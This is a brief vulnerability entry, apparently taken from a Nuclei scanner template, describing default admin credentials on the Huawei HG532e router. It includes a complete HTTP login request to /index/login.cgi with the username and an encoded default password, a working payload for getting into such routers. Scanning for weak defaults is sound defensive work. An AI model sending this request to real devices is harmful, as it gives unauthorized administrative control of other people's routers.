# Vulnerability: Huawei HG532e Default Credential
**Classification:** CWE-522
**Source:** Nuclei Template (`huawei-HG532e-default-router-login.yaml`)

## Description
Huawei HG532e default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index/login.cgi HTTP/1.1
Host: {{Hostname}}
Cookie: Language=en; FirstMenu=Admin_0; SecondMenu=Admin_0_0; ThirdMenu=Admin_0_0_0
Content-Type: application/x-www-form-urlencoded

Username=user&Password=MDRmODk5NmRhNzYzYjdhOTY5YjEwMjhlZTMwMDc1NjllYWYzYTYzNTQ4NmRkYWIyMTFkNTEyYzg1YjlkZjhmYg%3D%3D
```

